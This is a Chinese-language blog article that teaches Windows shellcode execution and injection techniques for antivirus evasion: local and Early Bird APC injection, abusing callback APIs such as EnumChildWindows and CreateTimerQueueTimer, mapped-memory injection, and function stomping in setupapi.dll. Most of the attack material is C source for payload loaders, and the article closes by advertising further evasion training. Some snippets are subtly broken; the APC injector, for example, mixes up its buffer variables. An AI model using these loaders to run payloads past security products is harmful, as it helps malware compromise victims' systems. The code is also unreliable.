#  干货 | 代码执行高级方式--APC注入 回调函数 映射注入 函数踩踏   
原创 putao  渗透Xiao白帽   2024-06-23 17:04  
  
本文目录  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfB5n3UXjoqpY0CmJKa1bKWkvGkpmcx7qzwquN9On8S6c5dobia2lxRDiaw/640?wx_fmt=jpeg&from=appmsg "")  
## APC注⼊  
  
另⼀种⽆需创建新线程即可运⾏有效负载的⽅法。此技术称为 APC 注⼊。  
### 什么是 APC？  
  
异步过程程调⽤ 是⼀种 Windows 操作系统机制，它使程序能够异步执⾏任务，同时继续运⾏其他  
  
任务。APC 被实现为在特定线程上下⽂中执⾏的内核模式例程。恶意软件可以利⽤ APC 将有效  
  
负载排队，然后在安排时执⾏它。  
  
Asynchronous Procedure Calls - Win32 apps | Microsoft Learn  
### 可报警状态  
  
并⾮所有线程都可以运⾏排队的 APC 函数，只有处于可警告状态 的线程才能这样做。可警告状  
  
态线程是处于等待状态的线程。当线程进⼊可警告状态时，它会被放置在可警告线程队列中，从⽽  
  
允许它运⾏排队的 APC 函数。  
### 什么是APC队列？  
  
要将 APC 函数排队到线程，必须将 APC 函数的地址传递给QueueUserAPC WinAPI。根据  
  
Microsoft 的⽂档：  
  
应⽤程序通过调⽤ QueueUserAPC 函数将 APC 排队到线程。调⽤线程在对 QueueUserAPC 的  
  
调⽤中指定 APC 函数的地址。  
  
注⼊的有效载荷的地址将被传递QueueUserAPC以执⾏它。在执⾏此操作之前，必须将本地进程  
  
中的线程置于可警告状态。  
### 队列⽤户APC--QueueUserAPC  
  
QueueUserAPC如下所示，它接受 3 个参数：  
- pfnAPC- 要调⽤的APC函数的地址  
  
- hThread- 可警告线程或挂起线程的句柄  
  
- dwData- 如果 APC 函数需要参数，可以在此处传递。该值将位于NULL此模块的代码中。  
  
```
DWORD QueueUserAPC(
 [in] PAPCFUNC pfnAPC,
 [in] HANDLE hThread,
 [in] ULONG_PTR dwData
);
```  
### 将线程置于可警告状态  
  
执⾏排队函数的线程需要处于可警告状态。这可以通过创建线程并使⽤以下 WinAPI 之⼀来实现：  
```
Sleep
Sleep function (synchapi.h) - Win32 apps | Microsoft Learn

SleepEx
SleepEx function (synchapi.h) - Win32 apps | Microsoft Learn

MsgWaitForMultipleObjects
MsgWaitForMultipleObjects function (winuser.h) - Win32 apps | Microsoft Learn

MsgWaitForMultipleObjectsEx
MsgWaitForMultipleObjectsEx function (winuser.h) - Win32 apps | Microsoft Learn

WaitForSingleObject
WaitForSingleObject function (synchapi.h) - Win32 apps | Microsoft Learn

WaitForSingleObjectEx
WaitForMultipleObjectsEx function (synchapi.h) - Win32 apps | Microsoft Learn

WaitForMultipleObjects
WaitForMultipleObjects function (synchapi.h) - Win32 apps | Microsoft Learn

WaitForMultipleObjectsEx
WaitForMultipleObjectsEx function (synchapi.h) - Win32 apps | Microsoft Learn

SignalObjectAndWait
SignalObjectAndWait function (synchapi.h) - Win32 apps | Microsoft Learn
```  
  
  
这些函数⽤于同步线程并提⾼应⽤程序的性能和响应能⼒，但在这种情况下，将句柄传递给虚拟事  
  
件就⾜够了。⽆需将正确的参数传递给这些函数，因为只需使⽤其中⼀个函数就⾜以将线程置于可  
  
警告状态。  
  
要创建虚拟事件，将使⽤CreateEvent WinAPI。新创建的事件对象是⼀个同步对象，它允许线程通  
  
过发信号和等待事件来相互通信。由于的输出CreateEvent⽆关紧要，因此可以将任何有效事件传  
  
递给前⾯显示的 WinAPI。  
### 使⽤函数  
  
以下任何函数都可以⽤作牺牲可警告线程来运⾏排队的 APC 有效负载。请参阅下⾯的示例，了解  
  
如何使⽤这些函数将当前线程置于可警告状态。  
### 使⽤Sleep  
```
VOID AlertableFunction1() {
Sleep(-1);
}
```  
### 使⽤SleepEx  
```
VOID AlertableFunction2() {
SleepEx(INFINITE, TRUE);
}
```  
### 使⽤WaitForSingleObject  
```
VOID AlertableFunction3() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent){
WaitForSingleObject(hEvent, INFINITE);
CloseHandle(hEvent);
}
}
```  
### 使⽤MsgWaitForMultipleObjects  
```
VOID AlertableFunction4() {
HANDLE hEvent = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent) {
MsgWaitForMultipleObjects(1, &hEvent, TRUE, INFINITE, QS_INPUT);
CloseHandle(hEvent);
}
}
```  
### 使⽤SignalObjectAndWait  
```
VOID AlertableFunction5() {
HANDLE hEvent1 = CreateEvent(NULL, NULL, NULL, NULL);
HANDLE hEvent2 = CreateEvent(NULL, NULL, NULL, NULL);
if (hEvent1 && hEvent2) {
SignalObjectAndWait(hEvent1, hEvent2, INFINITE, TRUE);
CloseHandle(hEvent1);
CloseHandle(hEvent2);
}
}
```  
### 暂停线程  
  
QueueUserAPC如果⽬标线程是在挂起状态下创建的，则也可以成功。如果使⽤此⽅法来执⾏有  
  
效负载，QueueUserAPC 则应⾸先调⽤该⽅法，然后恢复挂起的线程。  
  
同样，线程必须在挂起状态下创建，挂起现有线程将不起作⽤。  
### APC注⼊实现逻辑  
  
总结⼀下，实现逻辑如下：  
1. ⾸先，创建⼀个运⾏前⾯提到的函数之⼀的线程，将其置于可警报状态。  
  
1. 将有效载荷注⼊内存。  
  
1. 线程句柄和有效载荷基址将作为输⼊参数传递给QueueUserAPC。  
  
### APC 注射  
  
RunApcInjection是⼀个执⾏ APC 注⼊的函数，需要 3 个参数：  
- hThread- 可警告或暂停线程的句柄。  
  
- pPayload- 指向有效载荷基地址的指针。  
  
- sPayloadSize- 有效载荷的⼤⼩。  
  
```
BOOL RunApcInjection(IN HANDLE hThread, IN PBYTE pPayload, IN SIZE_T sPayl
oadSize) {
PVOID payloadAddress = NULL;
DWORD dwOldProtection = NULL;
pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PA
GE_READWRITE);
if (pAddress == NULL) {
return FALSE;
}
memcpy(pAddress, payloadAddress, sPayloadSize);
if (!VirtualProtect(payloadAddress, sPayloadSize, PAGE_EXECUTE_READWRIT
E, &dwOldProtection)) {
return FALSE;
}
if (!QueueUserAPC((PAPCFUNC)payloadAddress, hThread, NULL)) {
return FALSE;
}
return TRUE;
}
```  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfB0eNCouC2NgXgB8D7ZzZgta44BRvibmagxyic0YyxJwhTfmNpWTCWD6dQ/640?wx_fmt=jpeg&from=appmsg "")  
  
## APC远程注⼊  
  
QueueUserAPC⽤于执⾏本地 APC 注⼊。接下来我们将使⽤相同的 API 在远程进程中执⾏有效负载。  
  
虽然⽅法略有不同，但使⽤的⽅法是相同的。  
  
现在读者应该已经明⽩了，APC 注⼊需要挂起或可警告的线程才能成功执⾏有效载荷。然⽽，很难遇到处于这些状态的线程，尤其是在正常⽤户权限下运⾏的线程。  
  
解决⽅案是使⽤ WinAPI 创建⼀个挂起进程CreateProcess ，并使⽤其挂起线程的句柄。挂起线程符合 APC 注⼊的标准。这种⽅法称为 Early Bird APC 注⼊。  
### Early Bird 实现逻辑 (1)  
  
该技术的实现逻辑如下：  
1. 使⽤该CREATE_SUSPENDED标志创建⼀个暂停的进程。  
  
1. 将有效载荷写⼊新的⽬标进程的地址空间。  
  
1. 从中获取暂停线程的句柄CreateProcess以及有效载荷的基地址并将它们传递给QueueUserAPC。  
  
1. 使⽤ WinAPI 恢复线程ResumeThread以执⾏有效负载  
  
### Early Bird 实现逻辑 (2)  
  
CreateProcess仍将被使⽤，但进程创建标志将CREATE_SUSPENDED更改为DEBUG_PROCESS，该DEBUG_PROCESS 标志将新进程创建为调试进程，并将本地进程作为其调试器。当进程被创建为调试进程时，将在其⼊⼝点放置⼀个断点。这会暂停进程并等待调试器（即恶意软件）恢复执⾏。  
  
发⽣这种情况时，有效载荷将使⽤ WinAPI 注⼊⽬标进程并执⾏QueueUserAPC 。⼀旦有效载荷被注⼊，远程调试线程排队运⾏有效载荷，就可以使⽤ DebugActiveProcessStop WinAPI将本地进程与⽬标进程分离。从⽽停⽌对远程进程的调试。  
  
DebugActiveProcessStop PROCESS_INFORMATION只需要⼀个参数，即可以从填充的结构中获取的被调试进程的 PID CreateProcess。  
### 更新的实施逻辑  
  
更新后的实施⽅案如下：  
1. 通过设置标志来创建调试的进程DEBUG_PROCESS。  
  
1. 将有效载荷写⼊新的⽬标进程的地址空间。  
  
1. 从中获取调试线程的句柄CreateProcess以及有效载荷的基地址并将它们传递给QueueUserAPC。  
  
1. 停⽌远程线程的调试，使⽤DebugActiveProcessStop它来恢复其线程并执⾏有效载荷。  
  
### Early Bird APC 注射  
  
RemoteAPCinject是⼀个执⾏ Early Bird APC Injection 的函数，需要 4 个参数：  
- lpProcessName- 要创建的流程的名称。  
  
- dwProcessId- 指向 DWORD 的指针，它将接收新创建的进程的 PID。  
  
- hProcess- 指向将接收新创建进程句柄的句柄的指针。  
  
- hThread- 指向将接收新创建进程的线程的 HANDLE 的指针。  
  
```
BOOL RemoteAPCinject(LPCSTR lpProcessName, DWORD* dwProcessId, HANDLE* hPr
ocess, HANDLE* hThread) {
CHAR lpPath [MAX_PATH * 2];
CHAR WnDr [MAX_PATH];
STARTUPINFO Si = { 0 };
PROCESS_INFORMATION Pi = { 0 };
RtlSecureZeroMemory(&Si, sizeof(STARTUPINFO));
RtlSecureZeroMemory(&Pi, sizeof(PROCESS_INFORMATION));
Si.cb = sizeof(STARTUPINFO);
if (!GetEnvironmentVariableA("WINDIR", WnDr, MAX_PATH)) {
printf("[!] GetEnvironmentVariableA Failed With Error : %d \n", GetLas
tError());
return FALSE;
}
sprintf(lpPath, "%s\\System32\\%s", WnDr, lpProcessName);
printf("\n\t[i] Running : \"%s\" ... ", lpPath);
// Creating the process
if (!CreateProcessA(
NULL,
lpPath,
NULL,
NULL,
FALSE,
DEBUG_PROCESS, // Instead of CREATE_SUSPENDED
NULL,
NULL,
&Si,
&Pi)) {
return FALSE;
}
// Filling up the OUTPUT parameter with CreateProcessA's output
*dwProcessId = Pi.dwProcessId;
*hProcess = Pi.hProcess;
*hThread = Pi.hThread;
if (*dwProcessId != NULL && *hProcess != NULL && *hThread != NULL)
return TRUE;
return FALSE;
}
```  
  
freebuf的编辑体验不太好，吞了代码缩进，读者复现的时候自己注意一下缩进问题，或者你把代码给gpt让他改一下缩进  
  
## 回调函数完成代码执⾏  
  
回调函数⽤于处理事件或在满⾜条件时执⾏操作。它们⽤于 Windows 操作系统中的各种场景，包括事件处理、窗⼝管理和多线程。Microsoft 对回调函数的定义如下：  
  
回调函数是托管应⽤程序中的代码，可帮助⾮托管 DLL 函数完成任务。对回调函数的调⽤从托管应⽤程序间接传递，通过 DLL 函数，再返回到托管实现。  
  
⼀些普通的 Windows API 具有使⽤回调执⾏有效负载的能⼒。使⽤它们可以对抗安全解决⽅案，因为这些函数可能看起来是良性的，并且可以潜在地逃避⼀些安全解决⽅案。  
### 滥⽤回调函数  
  
Windows 回调可以使⽤函数指针执⾏。要运⾏有效载荷，必须传递有效载荷的地址，⽽不是有效的回调函数指针。回调执⾏可以取代使⽤ WinAPICreateThread和其他线程相关技术来执⾏有效载荷。此外，⽆需通过传递适当的参数来正确使⽤这些函数。这些函数的返回值或功能并不重要。  
  
关于回调函数的⼀个重要点是它们只能在本地进程地址空间中⼯作并且不能⽤于执⾏远程代码注⼊技术。  
### 回调函数示例  
  
以下函数都是能够执⾏回调函数。  
  
EnumUILanguagesW 的第⼀个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBWoGjLB8KGR5cz1iaQsTvpaRVVGdiaBFNcGwdwhbzYd1CWCPtmmH6MKibA/640?wx_fmt=jpeg&from=appmsg "")  
  
EnumChildWindows 的第⼆个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBiaA2fVB32TiaztDCaiad5I46vyiakibbb4W4qPBAWnc0YHMMvXQ846r40FA/640?wx_fmt=jpeg&from=appmsg "")  
  
CreateTimerQueueTimer 的第三个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBrmTDYqcuGjWYf6rMZtvP3R7egomgxOhqwc2fDRVcyTtMCAWicxjRQeQ/640?wx_fmt=jpeg&from=appmsg "")  
  
VerifierEnumerateResource 的第四个参数  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBlT3icxibz4Klars4KR9ZjbCh3UK0nIIOSHtUo1RzicOHxFzvHz50jsZdg/640?wx_fmt=jpeg&from=appmsg "")  
  
下面将对每个函数进⾏详细说明。代码示例中使⽤的有效负载存储在.text⼆进制⽂件的部分  
  
中。这使得 shellcode 拥有所需的RX内存权限，⽽⽆需使⽤VirtualAlloc或其他内存分配函数来分  
  
配可执⾏内存。  
  
换截图以后感觉代码观感好很多了  
  
  
### 使⽤ CreateTimerQueueTimer  
  
CreateTimerQueueTimer创建新的计时器并将其添加到指定的计时器队列。计时器使⽤回调函数指定，该函数在计时器到期时调⽤。回调函数由创建计时器队列的线程执⾏Payload下⾯的代码⽚段以回调函数的形式运⾏位于的代码。  
```
HANDLE hTimer = NULL;
if (!CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)Payload, NUL
L, NULL, NULL, NULL)){
printf("[!] CreateTimerQueueTimer Failed With Error : %d \n", GetLastErro
r());
return -1;
}
```  
### 使⽤ EnumChildWindows  
  
EnumChildWindows允许程序枚举⽗窗⼝的⼦窗⼝。它以⽗窗⼝句柄作为输⼊，并将⽤户定义的回调函数逐个应⽤于每个⼦窗⼝。回调函数会为每个⼦窗⼝调⽤，并接收⼦窗⼝句柄和⽤户定义的值作为参数。  
  
Payload下⾯的代码⽚段以回调函数的形式运⾏位于的代码。  
```
if (!EnumChildWindows(NULL, (WNDENUMPROC)Payload, NULL)) {
printf("[!] EnumChildWindows Failed With Error : %d \n", GetLastError
());
return -1;
}
```  
### 使⽤ EnumUILanguagesW  
  
EnumUILanguagesW枚举系统上安装的⽤户界⾯ (UI) 语⾔。它以回调函数作为参数，并将回调函数逐个应⽤于每种 UI 语⾔。请注意，任何值（⽽不是MUI_LANGUAGE_NAME标志）仍然有效。  
  
Payload下⾯的代码⽚段以回调函数的形式运⾏位于的代码。  
```
if (!EnumUILanguagesW((UILANGUAGE_ENUMPROCW)Payload, MUI_LANGUAGE_NAME, NUL
L)) {
printf("[!] EnumUILanguagesW Failed With Error : %d \n", GetLastError
());
return -1;
}
```  
### 使⽤ VerifierEnumerateResource  
  
VerifierEnumerateResource⽤于枚举指定模块中的资源。资源是存储在模块（如可执⾏⽂件或动态链接库）中的数据，可在运⾏时由该模块或其他模块访问。资源的示例包括字符串、位图和对话框模板。  
  
VerifierEnumerateResource是从 导出的，因此必须使⽤和WinAPIverifier.dll动态加载模块才能访问该函数。LoadLibraryGetProcAddress  
  
这里注意，如果ResourceType参数不等于，AvrfResourceHeapAllocation则不会执⾏有效载荷。  
  
AvrfResourceHeapAllocation允许函数枚举堆分配，包括堆元数据块。  
```
HMODULE hModule = NULL;
fnVerifierEnumerateResource pVerifierEnumerateResource = NULL;
hModule = LoadLibraryA("verifier.dll");
if (hModule == NULL){
printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
return -1;
}
pVerifierEnumerateResource = GetProcAddress(hModule, "VerifierEnumerateR
esource");
if (pVerifierEnumerateResource == NULL) {
printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError
());
return -1;
}
// Must set the AvrfResourceHeapAllocation flag to run the payload
pVerifierEnumerateResource(GetCurrentProcess(), NULL, AvrfResourceHeapAl
location, (AVRF_RESOURCE_ENUMERATE_CALLBACK)Payload, NULL);
```  
  
附一个项目  
  
**https://github.com/aahmad097/AlternativeShellcodeExec**  
  
### 映射注⼊  
  
到⽬前为⽌，在之前的所有实现中，都使⽤私有内存类型来在执⾏期间存储有效载荷。私有内存使⽤VirtualAlloc或进⾏分配VirtualAllocEx。下图显示了包含有效载荷的“LocalThreadHijacking”实现中分配的私有内存。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBRzyUfgMF0zes44k1Ws0WnN7z1hfvYnhI1ib8Qgsibj2xQgQcernOF5pQ/640?wx_fmt=jpeg&from=appmsg "")  
### 映射内存  
  
由于恶意软件⼴泛使⽤私有内存，因此安全解决⽅案会严格监控分配私有内存的过程。为了避免这些常被监控的 WinAPI（例如VirtualAlloc/Ex和 ）VirtualProtect/Ex，映射注⼊Mapped使⽤不同的 WinAPI（例CreateFileMapping和 ）来使⽤内存类型MapViewOfFile。  
  
另外注意，VirtualProtect/ExWinAPI 不能⽤于更改映射内存的内存权限。  
### 创建⽂件映射  
  
CreateFileMapping 创建⼀个⽂件映射对象，该对象通过内存映射技术提供对⽂件内容的访问。  
  
它允许进程创建⼀个虚拟内存空间，该空间映射到磁盘上⽂件的内容或其他内存位置。该函数返回⽂件映射对象的句柄。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBmJujgQDBWpDicVRzfzSASehcesW0ck9k9PicU86LIwZUiciczE64LgOKYA/640?wx_fmt=jpeg&from=appmsg "")  
  
此技术所需的 3 个参数说明如下。标记为⾮必需的参数可以设置为NULL。  
- hFile- 指向要从中创建⽂件映射句柄的⽂件的句柄。由于实现中不需要从⽂件创建⽂件映射，因此INVALID_HANDLE_VALUE可以使⽤该标志代替。MicrosoftINVALID_HANDLE_VALUE对该标志的解释如下：  
  
如果 hFile 是 INVALID_HANDLE_VALUE，调⽤进程还必须在 dwMaximumSizeHigh 和dwMaximumSizeLow 参数中指定⽂件映射对象的⼤⼩。在这种情况下，CreateFileMapping 会创建⼀个指定⼤⼩的⽂件映射对象，该对象由系统⻚⾯⽂件⽽不是⽂件系统中的⽂件⽀持。  
  
设置此标志允许函数在不使⽤磁盘⽂件的情况下执⾏其任务，⽽是在内存中创建具有dwMaximumSizeHigh或dwMaximumSizeLow参数指定⼤⼩的⽂件映射对象。  
- flProtect- 指定⽂件映射对象的⻚⾯保护。在此实现中，它将被设置为PAGE_EXECUTE_READWRITE。请注意，这不会创建⼀个RWX部分，⽽是指定它可以稍后创建。如果它被设置为PAGE_READWRITE，那么以后就不可能执⾏有效载荷。  
  
- dwMaximumSizeLow- 返回的⽂件映射句柄的⼤⼩。该值将是有效载荷的⼤⼩。  
  
### MapViewOfFile  
  
MapViewOfFile 将⽂件映射对象的视图映射到进程的地址空间中。它获取⽂件映射对象的句柄和所需的访问权限，并返回指向进程地址空间中映射开头的指针。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBYFL3AbuF2Fml1s4jhRZED3YI0W8gpJOkux2UtlVZP6FLsTURibrUJzA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
此技术所需的 3 个参数说明如下。标记为⾮必需的参数可以设置为NULL。  
- hFileMappingObject- WinAPI 返回的句柄CreateFileMapping，即⽂件映射对象。  
  
- dwDesiredAccess- 对⽂件映射对象的访问类型，它决定了所创建⻚⾯的⻚⾯保护。换句话说，就是调⽤所分配内存的内存权限MapViewOfFile。由于CreateFileMapping设置为PAGE_EXECUTE_READWRITE，此参数将同时使⽤FILE_MAP_EXECUTE和FILE_MAP_WRITE标志来返回有效的可执⾏和可写内存，这是复制有效载荷并在之后执⾏它所需要的。  
  
如果PAGE_READWRITE在中使⽤了该标志，并且在中使⽤了CreateFileMapping该标志，那么将会失败，因为尝试从可读写对象句柄创建可执⾏内存，这是不可能的。  
  
FILE_MAP_EXECUTEMapViewOfFileMapViewOfFileCreateFileMapping  
- dwNumberOfBytesToMap- 有效载荷的⼤⼩。  
  
### 局部映射注⼊函数  
- LocalMapInject是执⾏本地映射注⼊的函数。它需要 3 个参数：  
  
- pPayload- 有效载荷的基地址。  
  
- sPayloadSize- 有效载荷的⼤⼩。  
  
- ppAddress- 指向接收映射内存基地址的 PVOID 指针。  
  
该函数分配⼀个本地映射的可执⾏缓冲区并复制该缓冲区的有效载荷，然后返回映射内存的基地址。  
```
BOOL LocalMapInject(IN PBYTE pPayload, IN SIZE_T sPayloadSize, OUT PVOID*
ppAddress) {
BOOL bSTATE = TRUE;
HANDLE hFile = NULL;
PVOID pMapAddress = NULL;
// Create a file mapping handle with RWX memory permissions
// This does not allocate RWX view of file unless it is specified in th
e subsequent MapViewOfFile call 
hFile = CreateFileMappingW(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READ
WRITE, NULL, sPayloadSize, NULL);
if (hFile == NULL) {
printf("[!] CreateFileMapping Failed With Error : %d \n", GetLastError
());
bSTATE = FALSE; goto _EndOfFunction;
}
// Maps the view of the payload to the memory
pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NU
LL, NULL, sPayloadSize);
if (pMapAddress == NULL) {
printf("[!] MapViewOfFile Failed With Error : %d \n", GetLastError());
bSTATE = FALSE; goto _EndOfFunction;
}
 // Copying the payload to the mapped memory
memcpy(pMapAddress, pPayload, sPayloadSize);
_EndOfFunction:
*ppAddress = pMapAddress;
if (hFile)
CloseHandle(hFile);
return bSTATE;
}
```  
## 本地函数踩踏注⼊  
  
前⾯演示的映射注⼊模块⽤于避免使⽤VirtualAlloc/ExWinAPI 调⽤。本模块将演示另⼀种避免使⽤这些 WinAPI 的⽅法。  
### 函数踩踏  
  
术语“stomping”指的是⽤不同的数据覆盖或替换程序中函数或其他数据结构的内存的⾏为。  
  
函数踩踏是⼀种技术，其中原始函数的字节被新代码替换，导致函数被替换或不再按预期⼯作。相反，该函数将执⾏不同的逻辑。要实现这⼀点，需要踩踏牺牲函数地址。  
### 选择⽬标函数  
  
在本地检索函数的地址很简单，但检索哪个函数是此技术的主要关注点。覆盖常⽤函数可能会导致有效负载。不受控制地执⾏，或者进程崩溃。避免使⽤ntdll中的函数。相反，应该针对不太常⽤的函数，例如，MessageBox因为操作系统或其他应⽤程序很少会使⽤它。  
### 使⽤ Stomped 函数  
  
当⽬标函数的字节被替换为有效载荷的字节时，该函数将⽆法再使⽤，除⾮它专⻔⽤于执⾏有效载荷。例如，如果⽬标函数是MessageBoxA那么⼆进制⽂件应该只调⽤MessageBoxA⼀次，即执⾏有效载荷时。  
### 本地函数踩踏代码  
  
对于下⾯的代码演示，⽬标函数是SetupScanFileQueueA。这是⼀个完全随机的函数，但如果被覆盖，不太可能导致任何问题。根据微软的⽂档，该函数是从setupapi.dll导出的  
  
SetupScanFileQueueA。因此，第⼀步是Setupapi.dll使⽤ LoadLibraryA加载到本地进程内存中，然后使⽤GetProcAddress检索函数的地址GetProcAddress。  
  
下⼀步是破坏该函数并将其替换为有效载荷。通过使⽤ 将其内存区域标记为可读和可写，确保可以覆盖该函数VirtualProtect。接下来，将有效载荷写⼊函数的地址，最后VirtualProtect再次使⽤  
  
该区域将该区域标记为可执⾏（RX或RWX）  
```
#define SACRIFICIAL_DLL "setupapi.dll"
#define SACRIFICIAL_FUNC "SetupScanFileQueueA"
// ...
BOOL WritePayload(IN PVOID pAddress, IN PBYTE pPayload, IN SIZE_T sPayload
Size) {
DWORD dwOldProtection = NULL;
if (!VirtualProtect(pAddress, sPayloadSize, PAGE_READWRITE, &dwOldProtec
tion)){
printf("[!] VirtualProtect [RW] Failed With Error : %d \n", GetLastErr
or());
return FALSE;
}
memcpy(pAddress, pPayload, sPayloadSize);
if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwO
ldProtection)) {
printf("[!] VirtualProtect [RWX] Failed With Error : %d \n", GetLastEr
ror());
return FALSE;
}
return TRUE;
}
int main() {
PVOID pAddress = NULL;
HMODULE hModule = NULL;
HANDLE hThread = NULL;
printf("[#] Press <Enter> To Load \"%s\" ... ", SACRIFICIAL_DLL);
getchar();
printf("[i] Loading ... ");
hModule = LoadLibraryA(SACRIFICIAL_DLL);
if (hModule == NULL){
printf("[!] LoadLibraryA Failed With Error : %d \n", GetLastError());
return -1;
}
printf("[+] DONE \n");
pAddress = GetProcAddress(hModule, SACRIFICIAL_FUNC);
if (pAddress == NULL){
printf("[!] GetProcAddress Failed With Error : %d \n", GetLastError
());
return -1;
}
printf("[+] Address Of \"%s\" : 0x%p \n", SACRIFICIAL_FUNC, pAddress);
printf("[#] Press <Enter> To Write Payload ... ");
getchar();
printf("[i] Writing ... ");
if (!WritePayload(pAddress, Payload, sizeof(Payload))) {
return -1;
}
printf("[+] DONE \n");
printf("[#] Press <Enter> To Run The Payload ... ");
getchar();
hThread = CreateThread(NULL, NULL, pAddress, NULL, NULL, NULL);
if (hThread != NULL)
WaitForSingleObject(hThread, INFINITE);
printf("[#] Press <Enter> To Quit ... ");
getchar();
return 0;
}
```  
### 将 DLL 插⼊⼆进制⽂件  
  
⽆需使⽤ 加载 DLL LoadLibrary，然后使⽤ 检索⽬标函数的地址GetProcAddress，⽽是可以将DLL 静态链接到⼆进制⽂件中。使⽤ pragma comment 编译器指令可以实现这⼀点，如下所示。  
```
```  
  
然后，只需使⽤地址运算符（例如&SetupScanFileQueueA）即可检索⽬标函数。下⾯的代码⽚段更新了之前的代码⽚段，以使⽤ pragma comment 指令。  
```
#pragma comment (lib, "Setupapi.lib")
int main() {
HANDLE hThread = NULL;
getchar();
if (!WritePayload(&SetupScanFileQueueA, Payload, sizeof(Payload))) { //
Using the address-of operator
return -1;
}
getchar();
hThread = CreateThread(NULL, NULL, SetupScanFileQueueA, NULL, NULL, NUL
L);
if (hThread != NULL)
WaitForSingleObject(hThread, INFINITE)
getchar();
return 0;
}
```  
  
原⽣字节  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBP3VCdbBdSd1XBleGL8qYvbNqcgHZDib0A5aorR64z6l6R8EJsSD5qQQ/640?wx_fmt=jpeg&from=appmsg "")  
  
有效负载替换  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBJB9G8ia3E9SuYom8syTB4RBic68ZJ5l5pCloQic65x6fKzsAvSib1BibKZg/640?wx_fmt=jpeg&from=appmsg "")  
  
  
**更多免杀干货学习可扫码交流咨询：**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGtlmgZK5lboibRbNJM0TcfBvSrXqY5V9ESNRwHichPOOmZ8CrC4LtXkqjtrNya2Ry8V0k05tLtibpKA/640?wx_fmt=png&from=appmsg "")  
  
  
